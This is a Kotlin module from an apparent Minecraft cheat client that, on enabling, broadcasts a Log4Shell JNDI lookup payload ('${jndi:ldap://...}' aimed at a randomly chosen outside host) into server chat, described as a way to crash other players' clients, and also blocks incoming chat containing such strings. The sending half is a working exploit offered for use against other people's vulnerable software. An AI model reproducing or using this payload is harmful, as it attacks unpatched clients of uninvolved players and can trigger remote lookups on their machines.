/*
 * This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package kevin.module.modules.exploit

import kevin.event.EventTarget
import kevin.event.PacketEvent
import kevin.module.Module
import kevin.module.ModuleCategory
import kevin.utils.ChatUtils
import net.minecraft.network.play.client.C01PacketChatMessage
import net.minecraft.network.play.server.S02PacketChat

class Log4j2 : Module("Log4j2", "Anti log4j2 exploit and use it to crash other player client.", category = ModuleCategory.EXPLOIT) {
    override fun onEnable() {
        val m = arrayOf(
            "www.baidu.com",
            "liquidbounce.net",
            "fanyi.sogou.com",
            "github.com",
            "scriptapi.liquidbounce.net",
        ).random()
        mc.netHandler.addToSendQueue(C01PacketChatMessage("\${jndi:ldap://$m}"))
        ChatUtils.messageWithStart("Sent crash packet... [$m]")
        this.state = false
    }
    @EventTarget(true)
    fun onPacket(event: PacketEvent) {
        val packet = event.packet
        if (packet is S02PacketChat &&
            (packet.chatComponent.formattedText.contains("\${jndi:")
                    || packet.chatComponent.unformattedText.contains("\${jndi:"))) {
            event.cancelEvent()
            ChatUtils.messageWithStart("Â§aCancel receiving message that may trigger vulnerability!!(${packet.chatComponent.formattedText.replace("\${","").replace("}","")})")
        }
    }
}